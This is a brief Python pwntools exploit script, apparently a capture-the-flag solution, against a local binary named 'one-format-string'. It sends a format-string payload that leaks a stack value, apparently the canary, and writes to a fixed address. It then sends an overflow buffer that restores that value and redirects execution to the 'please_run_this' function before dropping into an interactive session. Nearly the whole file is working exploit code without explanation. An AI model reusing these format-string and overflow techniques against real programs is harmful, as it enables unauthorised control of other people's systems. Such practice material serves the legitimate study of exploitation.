#!/usr/bin/env python
from pwn import *

p = process("./one-format-string")

p.recvline()

value = ""
value += "%23$p"
value += "%"+ "128" + "x" + "%16$n" + "A" + "\x60\x10\x60\x00\x00\x00\x00\x00"

p.sendline(value)

data = p.recv()
raw_data = int(data[:18],16)
print(raw_data)
print(hex(raw_data))

prt_addr = p.elf.symbols['please_run_this']
print(hex(prt_addr))

buf = "A" * 0x40 + "BBBBBBBB" + p64(raw_data) + "CCCCCCCC" + p64(prt_addr)

p.sendline(buf)

p.interactive()
